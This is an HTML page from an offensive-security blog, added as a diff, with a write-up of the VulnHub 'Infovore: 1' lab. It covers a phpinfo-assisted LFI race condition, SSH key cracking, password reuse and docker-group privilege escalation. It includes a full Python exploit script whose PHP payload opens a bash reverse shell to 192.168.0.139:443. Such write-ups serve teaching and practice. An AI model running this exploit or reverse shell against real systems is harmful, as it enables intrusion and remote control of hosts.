@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="/assets/css/style.css" />
+        <link rel="stylesheet" href="/assets/css/writeups/style.css" />
+        <title>Infovore: 1 - pwnerguy's shell stuff</title>
+        <!-- <link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicons/favicon.svg" /> -->
+        <link rel="shortcut icon" href="/assets/favicons/favicon.ico" />
+        <!-- <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicons/site.webmanifest" /> -->
+        <meta name="apple-mobile-web-app-title" content="pwnerguy's shell stuff" />
+        <!-- SEO -->
+        <meta name="description" content="pwnerguy's shell stuff is an offensive cybersecurity blog focused on solving practical labs from the Hack The Box, TryHackMe and VulnHub platforms." />
+        <meta name="keywords" content="pwnerguy, Rubén Martos, ethical hacking, ethical hacker, penetration testing, pentesting, offensive cybersecurity, cybersecurity, Hack The Box, TryHackMe, VulnHub, SysAdmin, Linux, Windows, writeups, projects, portfolio, pwnerguy.github.io" />
+        <meta name="author" content="pwnerguy" />
+        <meta name="robots" content="index, follow" />
+    </head>
+    <body>
+        <header>
+            <a href="/" class="logo">pwnerguy's shell stuff</a>
+            <nav>
+                <a href="/writeups">Writeups</a>
+                <a href="/cheatsheets">Cheat Sheets</a>
+            </nav>
+        </header>
+        <main>
+            
+        <a href="/writeups" class="back-link">← Go back</a>
+        <section class="writeup-content">
+            <h1>Infovore: 1</h1>
+<div class="writeup-tags"><span class="tag tag-vulnhub">VulnHub</span> <span class="tag tag-medium">Medium</span> <span class="tag tag-linux">Linux</span> <span class="tag tag-file-upload">File Upload</span> <span class="tag tag-lfi">LFI</span> <span class="tag tag-race-condition">Race Condition</span> <span class="tag tag-hash-cracking">Hash Cracking</span> <span class="tag tag-ssh-key-trust">SSH Key Trust</span> <span class="tag tag-docker-escape">Docker Escape</span></div>
+<hr>
+<h2>Introduction</h2>
+<p>This writeup documents the penetration testing of the <a href="https://www.vulnhub.com/entry/infovore-1,496/"><strong>infovore: 1</strong></a> machine. This machine has been downloaded from the <a href="https://vulnhub.com"><strong>VulnHub</strong></a> platform.  In this ocasion I&#39;ll exploit some php functions and lazy sys admins&#39; configurations as the description says.</p>
+<hr>
+<h2>Information Gathering</h2>
+<p>Firstly, we need to discover the IP of the <strong>infovore</strong> machine. We will use <strong>arp-scan</strong>.</p>
+<p><img src="/assets/images/infovore/arp-scan.png" alt=""></p>
+<p>I use the <strong>settarget</strong> function to set the target IP in the Polybar, so that we can see in any moment DarkHole&#39;s IP. After identifying the target&#39;s IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. <a href="https://github.com/pwnerguy/ttl-ripper"><strong>ttl-ripper.sh</strong></a> can also be used for this purpose.</p>
+<ul>
+<li>TTL 64: Linux.</li>
+<li>TTL 128: Windows.</li>
+</ul>
+<p>In this case it appears to be a Linux machine. Now we will perform a port scan.</p>
+<p><img src="/assets/images/infovore/nmap1.png" alt=""></p>
+<p><strong>extractPorts</strong> reads the grepable export file allPorts, shows me the open ports and copy them in the clipboard.  Let&#39;s perform a deeper scan using basic recon nmap scripts to see more information about the port 80.</p>
+<p><img src="/assets/images/infovore/nmap2.png" alt=""></p>
+<p>After performing this second scan we can see that we are facing an Apache web server running on a Debian machine. We can also see a title <strong>&quot;Include me ...&quot;</strong>.</p>
+<p>You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s <a href="https://pwnerguy.github.io/enumeration-cheatsheet/">Enumeration Cheat Sheet</a>, which includes a table mapping service versions to possible operating system versions. We are facing a <strong>Debian Buster</strong>.</p>
+<p><img src="/assets/images/infovore/codename.png" alt=""></p>
+<p>Once the OS and exposed services have been enumerated it&#39;s time to enumerate the web server.</p>
+<p><img src="/assets/images/infovore/whatweb.png" alt=""></p>
+<p><img src="/assets/images/infovore/webpage.png" alt=""></p>
+<p><img src="/assets/images/infovore/wappalyzer.png" alt=""></p>
+<p>It seems that the page it&#39;s not configurated at all. The links and buttons doesn&#39;t work and we can&#39;t see anything interesting in the source code of the page. However, both <strong>Wappalyzer</strong> and <strong>WhatWeb</strong> are indicating that PHP is being used server-side. </p>
+<p>Let&#39;s focus on fuzzing and PHP file enumeration. We&#39;ll brute-force the website to list directories and files. </p>
+<p><img src="/assets/images/infovore/gobuster.png" alt=""></p>
+<p>We find out some directories and PHP files. We see the classic <strong>info.php</strong> wich is generated by the PHP function <strong>phpinfo()</strong>. This file exposes all PHP configurations.</p>
+<p><img src="/assets/images/infovore/phpinfo.png" alt=""></p>
+<hr>
+<h2>Vulnerability Assesment</h2>
+<p>In <strong>php.info</strong> you can search any directives to abuse them.</p>
+<ul>
+<li><strong>disable_functions</strong> - no disable functions, so we can use system, shell_exec, exec, to exeute commands.</li>
+<li><strong>file_uploads</strong> - we can upload files.</li>
+</ul>
+<p>In the following link you can find information about this abuse: <a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html">https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html</a></p>
+<p>I&#39;ll focus on the LFI one. Firstly, we need a LFI vuln. I will use Burp Suite to send a POST request in order to force the upload of a PHP file. If I could find any way to force the server to interpretate my code (wich is a Reverse Shell) I could get into the server.</p>
+<p><img src="/assets/images/infovore/burpsuite1.png" alt=""></p>
+<p><strong>wfuzz</strong> detected the parameter <strong>filename</strong>.</p>
+<p><img src="/assets/images/infovore/wfuzz.png" alt=""></p>
+<hr>
+<h2>Exploitation</h2>
+<p>With the filename parameter we can see the content of /etc/passwd. However, we can&#39;t reach any files we upload through the POST request. </p>
+<p>Actually, the server is erasing the file at the moment we upload the file in question (it&#39;s a temporary resource: /tmp). So, we may have to consider a <strong>Race-Condition</strong>. To perform it, I&#39;ll download the following script: <a href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Files/phpinfolfi.py">https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Files/phpinfolfi.py</a> </p>
+<p>I&#39;m going to change some important variables. The final script was:</p>
+<pre><code class="language-python">#!/usr/bin/python
+# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+# The following line is not required but supposedly optimizes code.  
+# However, this breaks on some Python 2 installations, where the future module version installed is &gt; 0.16.  This can be a pain to revert.
+# from builtins import range
+from __future__ import print_function
+import sys
+import threading
+import socket
+
+def setup(host, port):
+    TAG=&quot;Security Test&quot;
+    PAYLOAD=&quot;&quot;&quot;%s\r
+&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.0.139/443 0&gt;&amp;1&#39;&quot;);?&gt;\r&quot;&quot;&quot; % TAG
+    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD
+    padding=&quot;A&quot; * 5000
+    REQ1=&quot;&quot;&quot;POST /info.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r
+HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)
+    #modify this to suit the LFI script
+    LFIREQ=&quot;&quot;&quot;GET /index.php?filename=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+&quot;&quot;&quot;
+    return (REQ1, TAG, LFIREQ)
+
+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((host, port))
+    s2.connect((host, port))
+
+    s.send(phpinforeq)
+    d = &quot;&quot;
+    while len(d) &lt; offset:
+        d += s.recv(offset)
+    try:
+        i = d.index(&quot;[tmp_name] =&amp;gt;&quot;)
+        if i == -1:
+            i = d.index(&quot;[tmp_name] =&amp;gt;&quot;)
+        fn = d[i+17:i+31]
+    except ValueError:
+        return None
+
+    s2.send(lfireq % (fn, host))
+    d = s2.recv(4096)
+    s.close()
+    s2.close()
+
+    if d.find(tag) != -1:
+        return fn
+
+counter=0
+class ThreadWorker(threading.Thread):
+    def __init__(self, e, l, m, *args):
+        threading.Thread.__init__(self)
+        self.event = e
+        self.lock =  l
+        self.maxattempts = m
+        self.args = args
+
+    def run(self):
+        global counter
+        while not self.event.is_set():
+            with self.lock:
+                if counter &gt;= self.maxattempts:
+                    return
+                counter+=1
+
+            try:
+                x = phpInfoLFI(*self.args)
+                if self.event.is_set():
+                    break
+                if x:
+                    print(&quot;\nGot it! Shell created in /tmp/g&quot;)
+                    self.event.set()
+
+            except socket.error:
+                return
+
+
+def getOffset(host, port, phpinforeq):
+    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(phpinforeq)
+
+    d = &quot;&quot;
+    while True:
+        i = s.recv(4096)
+        d+=i
+        if i == &quot;&quot;:
+            break
+        # detect the final chunk
+        if i.endswith(&quot;0\r\n\r\n&quot;):
+            break
+    s.close()
+    i = d.find(&quot;[tmp_name] =&amp;gt;&quot;)
+    if i == -1:
+        i = d.find(&quot;[tmp_name] =&amp;gt;&quot;)
+    if i == -1:
+        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)
+
+    print(&quot;found %s at %i&quot; % (d[i:i+10],i))
+    # padded up a bit
+    return i+256
+
+def main():
+
+    print(&quot;LFI With PHPInfo()&quot;)
+    print(&quot;-=&quot; * 30)
+
+    if len(sys.argv) &lt; 2:
+        print(&quot;Usage: %s host [port] [threads]&quot; % sys.argv[0])
+        sys.exit(1)
+
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error as e:
+        print(&quot;Error with hostname %s: %s&quot; % (sys.argv[1], e))
+        sys.exit(1)
+
+    port=80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError as e:
+        print(&quot;Error with port %d: %s&quot; % (sys.argv[2], e))
+        sys.exit(1)
+
+    poolsz=10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError as e:
+        print(&quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e))
+        sys.exit(1)
+
+    print(&quot;Getting initial offset...&quot;, end=&#39; &#39;)
+    reqphp, tag, reqlfi = setup(host, port)
+    offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
+
+    maxattempts = 1000
+    e = threading.Event()
+    l = threading.Lock()
+
+    print(&quot;Spawning worker pool (%d)...&quot; % poolsz)
+    sys.stdout.flush()
+
+    tp = []
+    for i in range(0,poolsz):
+        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+
+    for t in tp:
+        t.start()
+    try:
+        while not e.wait(1):
+            if e.is_set():
+                break
+            with l:
+                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))
+                sys.stdout.flush()
+                if counter &gt;= maxattempts:
+                    break
+        print()
+        if e.is_set():
+            print(&quot;Woot!  \m/&quot;)
+        else:
+            print(&quot;:(&quot;)
+    except KeyboardInterrupt:
+        print(&quot;\nTelling threads to shutdown...&quot;)
+        e.set()
+
+    print(&quot;Shuttin&#39; down...&quot;)
+    for t in tp:
+        t.join()
+
+if __name__==&quot;__main__&quot;:
+    print(&quot;Don&#39;t forget to modify the LFI URL&quot;)
+    main()
+</code></pre>
+<p>Basically, it will try to upload a file and point it many times until the file&#39;s code is interpretated.</p>
+<p><img src="/assets/images/infovore/phpinfolfi.py.png" alt=""></p>
+<hr>
+<h2>Post-Exploitation</h2>
+<pre><code class="language-bash"># tty upgrading
+❯ script /dev/null -c bash
+❯ Ctrl+Z
+❯ stty raw -echo; fg
+❯ reset xterm
+❯ export TERM=xterm
+❯ export SHELL=bash
+❯ stty rows 44 columns 185
+</code></pre>
+<p>If we run the command <code>hostname -I</code> we will notice that we are not in the real machine, we are in a <strong>container</strong>.</p>
+<ul>
+<li>We have no file /var/run/docker.sock, docker it&#39;s not installed.</li>
+<li><strong>capsh</strong> it&#39;s not installed.</li>
+<li>No users directories in /home and no users with a shell (only root and we can&#39;t access it)</li>
+<li>No PHP files in /var/www/html with the string &quot;<strong>password</strong>&quot;</li>
+<li>No files in the hole container with the string &quot;<strong>config</strong>&quot;</li>
+</ul>
+<p>To recon the container we will use the utility <a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS"><strong>linPEAS</strong></a>. If we run linPEAS we&#39;ll see the section &quot;Unexpected in root&quot; with the file <strong>.oldkeys.tgz</strong> that contains a public SSH key and a private SSH key. In this point, we&#39;ll try to break the private SSH key.</p>
+<p><img src="/assets/images/infovore/ssh2john.png" alt=""></p>
+<p><strong>ssh2john</strong> has converted the key into a hash. We&#39;ll try to crack the hash with john using the rockyou.txt dictionary. </p>
+<p>root&#39;s password is <strong>choclate93</strong>.</p>
+<p><img src="/assets/images/infovore/flag1.png" alt=""></p>
+<p>But remember, we need to scape the container.</p>
+<p><img src="/assets/images/infovore/proc_net_arp.png" alt=""></p>
+<p>In the directory /root/.ssh we see a public key file wich shows that the user admin can connect to 192.168.150.1, there&#39;s &quot;trust&quot; between them.</p>
+<p><img src="/assets/images/infovore/public_key_admin.png" alt=""></p>
+<p>We&#39;ll try to connect to 192.168.150.1 using the user admin and the same password as root.</p>
+<p>We can! There&#39;s a passord reuse.</p>
+<p><img src="/assets/images/infovore/flag2.png" alt=""></p>
+<p>admin is in the docker group. In this case I can create a container that mounts all the filesystem (even the root directory) into my container filesystem so I can access all directories and files.</p>
+<p><img src="/assets/images/infovore/privesc.png" alt=""></p>
+<p><img src="/assets/images/infovore/flag3.png" alt=""></p>
+
+        </section>
+    
+        </main>
+        <footer>
+            <p>© 2026 <strong>pwnerguy's shell stuff</strong></p>
+            <div class="icons">
+                <a href="mailto:rmp.it@proton.me" target="_blank"">
+                    <svg class="svg-inline--fa fa-envelope-square fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="envelope-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM178.117 262.104C87.429 196.287 88.353 196.121 64 177.167V152c0-13.255 10.745-24 24-24h272c13.255 0 24 10.745 24 24v25.167c-24.371 18.969-23.434 19.124-114.117 84.938-10.5 7.655-31.392 26.12-45.883 25.894-14.503.218-35.367-18.227-45.883-25.895zM384 217.775V360c0 13.255-10.745 24-24 24H88c-13.255 0-24-10.745-24-24V217.775c13.958 10.794 33.329 25.236 95.303 70.214 14.162 10.341 37.975 32.145 64.694 32.01 26.887.134 51.037-22.041 64.72-32.025 61.958-44.965 81.325-59.406 95.283-70.199z"></path></svg>
+                </a>
+                <a href="https://www.linkedin.com/in/r-mar" target="_blank">
+                    <svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg>
+                </a>
+                <a href="https://github.com/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg>
+                </a>
+                <a href="https://tryhackme.com/p/pwnerguy" target="_blank">
+                    <svg class="svg-inline--fa fa-user-secret fa-w-14" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="user-secret" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M383.9 308.3l23.9-62.6c4-10.5-3.7-21.7-15-21.7h-58.5c11-18.9 17.8-40.6 17.8-64v-.3c39.2-7.8 64-19.1 64-31.7 0-13.3-27.3-25.1-70.1-33-9.2-32.8-27-65.8-40.6-82.8-9.5-11.9-25.9-15.6-39.5-8.8l-27.6 13.8c-9 4.5-19.6 4.5-28.6 0L182.1 3.4c-13.6-6.8-30-3.1-39.5 8.8-13.5 17-31.4 50-40.6 82.8-42.7 7.9-70 19.7-70 33 0 12.6 24.8 23.9 64 31.7v.3c0 23.4 6.8 45.1 17.8 64H56.3c-11.5 0-19.2 11.7-14.7 22.3l25.8 60.2C27.3 329.8 0 372.7 0 422.4v44.8C0 491.9 20.1 512 44.8 512h358.4c24.7 0 44.8-20.1 44.8-44.8v-44.8c0-48.4-25.8-90.4-64.1-114.1zM176 480l-41.6-192 49.6 32 24 40-32 120zm96 0l-32-120 24-40 49.6-32L272 480zm41.7-298.5c-3.9 11.9-7 24.6-16.5 33.4-10.1 9.3-48 22.4-64-25-2.8-8.4-15.4-8.4-18.3 0-17 50.2-56 32.4-64 25-9.5-8.8-12.7-21.5-16.5-33.4-.8-2.5-6.3-5.7-6.3-5.8v-10.8c28.3 3.6 61 5.8 96 5.8s67.7-2.1 96-5.8v10.8c-.1.1-5.6 3.2-6.4 5.8z"></path></svg>
+                </a>
+                <a href="https://app.hackthebox.com/users/3026377" target="_blank" rel="noopener">
+                    <svg class="svg-inline--fa fa fa-cube" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="fa-cube" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M239.1 6.3l-208 78c-18.7 7-31.1 25-31.1 45v225.1c0 18.2 10.3 34.8 26.5 42.9l208 104c13.5 6.8 29.4 6.8 42.9 0l208-104c16.3-8.1 26.5-24.8 26.5-42.9V129.3c0-20-12.4-37.9-31.1-44.9l-208-78C262 2.2 250 2.2 239.1 6.3zM256 68.4l192 72v1.1l-192 78-192-78v-1.1l192-72zm32 356V275.5l160-65v133.9l-160 80z"></path></svg>
+                </a>
+            </div>
+        </footer>
+        <script>
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const q = searchInput.value.toLowerCase();
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`;
+            //             if (haystack.includes(q)) {
+            //                 card.classList.remove("hidden");
+            //             } else {
+            //                 card.classList.add("hidden");
+            //             }
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+            document.querySelectorAll('a[href^="http"]').forEach(a => {
+                a.setAttribute("target", "_blank");
+                a.setAttribute("rel", "noopener noreferrer");
+            });
+            });
+
+            // document.addEventListener("DOMContentLoaded", () => {
+            //     const cards = document.querySelectorAll('.writeup-card');
+            //     const searchInput = document.getElementById('searchInput');
+            //     if (!searchInput) return;
+            //     searchInput.addEventListener('input', () => {
+            //         const terms = searchInput.value
+            //             .toLowerCase()
+            //             .trim()
+            //             .split(/\s+/);
+            //         cards.forEach(card => {
+            //             const categories = (card.dataset.categories || "").toLowerCase();
+            //             const title = card.querySelector("h2").textContent.toLowerCase();
+            //             const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+            //             const matches = terms.every(t => haystack.includes(t));
+            //             card.classList.toggle("hidden", !matches);
+            //         });
+            //     });
+            // });
+
+            document.addEventListener("DOMContentLoaded", () => {
+                const cards = document.querySelectorAll('.writeup-card');
+                const searchInput = document.getElementById('searchInput');
+                const resultsCount = document.getElementById('resultsCount');
+
+                function updateCount() {
+                    const visible = document.querySelectorAll(".writeup-card:not(.hidden)").length;
+                    if (resultsCount) {
+                        resultsCount.textContent = `${visible} available machines`;
+                    }
+                }
+
+                if (!searchInput) return;
+
+                searchInput.addEventListener('input', () => {
+                    const terms = searchInput.value
+                        .toLowerCase()
+                        .trim()
+                        .split(/\s+/);
+
+                    cards.forEach(card => {
+                        const categories = (card.dataset.categories || "").toLowerCase();
+                        const title = card.querySelector("h2").textContent.toLowerCase();
+                        const haystack = `${categories} ${title}`.replace(/\s+/g, " ");
+
+                        const matches = terms.every(t => haystack.includes(t));
+                        card.classList.toggle("hidden", !matches);
+                    });
+
+                    updateCount();
+                });
+
+                updateCount();
+            });
+
+        </script>
+    </body>
+</html>
